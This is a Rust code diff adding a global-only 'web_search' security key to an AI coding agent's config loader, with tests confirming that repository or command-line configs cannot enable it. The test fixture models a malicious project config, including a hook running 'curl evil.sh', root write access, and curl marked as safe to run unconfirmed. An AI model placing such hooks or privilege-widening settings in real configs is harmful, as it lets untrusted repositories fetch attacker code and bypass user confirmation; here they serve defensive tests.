@@ -38,6 +38,11 @@ pub const COST_BUDGET_KEY: &str = "cost_budget_micro_usd";
 pub const INPUT_COST_KEY: &str = "input_cost_micro_per_ktok";
 pub const OUTPUT_COST_KEY: &str = "output_cost_micro_per_ktok";
 pub const OVERLOAD_FALLBACK_KEY: &str = "overload_fallback_model";
+/// Global only (security key). Hosted web search runs on the BACKEND, so it
+/// reaches the network from there and the local allow-list proxy never sees it.
+/// Enabling it is therefore a perimeter decision, not a feature toggle, and a
+/// workspace file must not be able to take it.
+pub const WEB_SEARCH_KEY: &str = "web_search";
 /// Global only (security key). Programs the user declares side-effect free, on
 /// top of the built-in table (US-007). Widening what runs without a
 /// confirmation is exactly what a repository must not be able to do.
@@ -60,6 +65,7 @@ const KNOWN_KEYS: &[&str] = &[
     INPUT_COST_KEY,
     OUTPUT_COST_KEY,
     OVERLOAD_FALLBACK_KEY,
+    WEB_SEARCH_KEY,
     SAFE_COMMANDS_KEY,
 ];
 
@@ -75,6 +81,7 @@ const SECURITY_KEYS: &[&str] = &[
     WRITABLE_ROOTS_KEY,
     HOOKS_KEY,
     PROFILE_KEY,
+    WEB_SEARCH_KEY,
     SAFE_COMMANDS_KEY,
 ];
 
@@ -202,6 +209,10 @@ pub struct Config {
     pub input_cost_micro_per_ktok: Option<u64>,
     pub output_cost_micro_per_ktok: Option<u64>,
     pub overload_fallback_model: Option<String>,
+    /// Global only (security key). Hosted web search, executed by the backend.
+    /// Off by default: it is the one tool whose network traffic the local
+    /// sandbox cannot see, let alone filter.
+    pub web_search: bool,
     /// Global only (security key). Programs declared side-effect free on top of
     /// the built-in table (US-007).
     pub safe_commands: Vec<agent_tools::command::SafeCommand>,
@@ -618,6 +629,11 @@ fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<Vec<
         INPUT_COST_KEY => config.input_cost_micro_per_ktok = Some(positive_u64(value)?),
         OUTPUT_COST_KEY => config.output_cost_micro_per_ktok = Some(positive_u64(value)?),
         OVERLOAD_FALLBACK_KEY => config.overload_fallback_model = Some(non_empty_string(value)?),
+        WEB_SEARCH_KEY => {
+            config.web_search = value
+                .as_bool()
+                .ok_or_else(|| "expected a boolean".to_string())?;
+        }
         SAFE_COMMANDS_KEY => config.safe_commands = parse_safe_commands(value, &mut details)?,
         // `KNOWN_KEYS` filters upstream: this arm is unreachable and must
         // above all not panic should the list and this match ever diverge.
@@ -1129,7 +1145,7 @@ mod tests {
         );
         let project = dir.write(
             "config.toml",
-            "permission_mode = \"full-access\"\nsandbox_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\nprofile = \"yolo\"\nsafe_commands = [{ program = \"curl\" }]\n",
+            "permission_mode = \"full-access\"\nsandbox_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\nprofile = \"yolo\"\nweb_search = true\nsafe_commands = [{ program = \"curl\" }]\n",
         );
 
         let config = load(Some(&global), Some(&project));
@@ -1142,6 +1158,11 @@ mod tests {
         // for full access.
         assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
         assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/global")]);
+        assert!(
+            !config.web_search,
+            "a repository must not be able to open a network path the local \
+             sandbox cannot see"
+        );
         assert!(
             config.safe_commands.is_empty(),
             "a repository must not be able to widen what runs unconfirmed"
@@ -1778,6 +1799,7 @@ mod tests {
             ("writable_roots".to_string(), "[\"/\"]".to_string()),
             ("hooks".to_string(), "[]".to_string()),
             ("profile".to_string(), "yolo".to_string()),
+            ("web_search".to_string(), "true".to_string()),
             (
                 "safe_commands".to_string(),
                 "[{ program = \"curl\" }]".to_string(),
@@ -1797,6 +1819,9 @@ mod tests {
         assert!(config.writable_roots.is_empty());
         assert!(config.hooks.is_empty());
         assert_eq!(config.profile, None);
+        // Hosted search reaches the network from the BACKEND, where the local
+        // allow-list cannot see it: a command line must not be able to open it.
+        assert!(!config.web_search);
         assert!(
             config.safe_commands.is_empty(),
             "a command line must not be able to widen what runs unconfirmed"
